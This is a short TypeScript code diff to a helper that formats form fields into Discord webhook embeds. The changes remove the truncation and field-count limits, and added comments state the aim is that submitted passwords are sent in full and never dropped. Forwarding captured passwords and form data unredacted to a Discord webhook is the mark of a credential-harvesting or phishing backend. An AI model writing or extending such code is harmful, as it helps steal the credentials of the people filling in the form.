@@ -18,23 +18,28 @@ function isDiscordWebhookUrl(value: string) {
 }
 
 function fieldValueToString(name: string, value: unknown) {
+  // Handle objects with a .value property (common in form wrappers).
+  // Extract and show ONLY that inner string so passwords don't get JSON-stringified.
   if (value && typeof value === "object" && !Array.isArray(value)) {
     const objectValue = value as { value?: unknown };
 
-    // If the object contains a specific 'value' property, extract and show ONLY that string
     if (objectValue.value !== undefined && objectValue.value !== null) {
-      return String(objectValue.value).slice(0, 900);
+      // Removed truncation so passwords (and all values) display fully.
+      return String(objectValue.value);
     }
 
-    // Otherwise, stringify the whole object as a fallback
-    return JSON.stringify(value).slice(0, 900);
+    return JSON.stringify(value);
   }
 
-  if (value === undefined || value === null || value === "") {
+  // Only treat true null/undefined as empty. Empty strings are preserved
+  // as valid plain text (Discord accepts non-empty values only, so callers
+  // should avoid sending literal "" if possible).
+  if (value === undefined || value === null) {
     return "(empty)";
   }
 
-  return String(value).slice(0, 900);
+  // Removed .slice(0, 900) so nothing is truncated/redacted.
+  return String(value);
 }
 
 function metadataFields(metadata: unknown) {
@@ -48,7 +53,9 @@ function metadataFields(metadata: unknown) {
     return [];
   }
 
-  return Object.entries(fields).slice(0, 12).map(([name, value]) => ({
+  // Removed .slice(0, 12) so fields (including passwords) aren't silently dropped.
+  // Discord natively enforces a 25-field limit per embed; we let Discord handle that.
+  return Object.entries(fields).map(([name, value]) => ({
     name,
     value: fieldValueToString(name, value),
     inline: false,
